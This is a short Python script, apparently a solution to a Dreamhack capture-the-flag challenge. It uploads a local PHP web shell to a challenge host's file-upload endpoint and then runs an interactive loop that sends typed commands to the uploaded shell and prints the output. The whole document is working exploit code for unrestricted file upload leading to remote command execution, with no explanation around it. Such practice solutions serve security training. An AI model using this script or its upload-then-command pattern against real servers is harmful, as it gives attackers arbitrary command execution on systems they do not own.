import re
import requests
from bs4 import BeautifulSoup


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:14913"
    with open("shell.php") as f:
        req = requests.post(url+'/upload.php', files={'file':f})
        print(BeautifulSoup(req.content, 'html.parser').prettify())
        while True:
            cmd = input("cmd: ")
            req = requests.get(url+'/uploads/shell.php', {'cmd':cmd})
            print(BeautifulSoup(req.content, 'html.parser').pre)
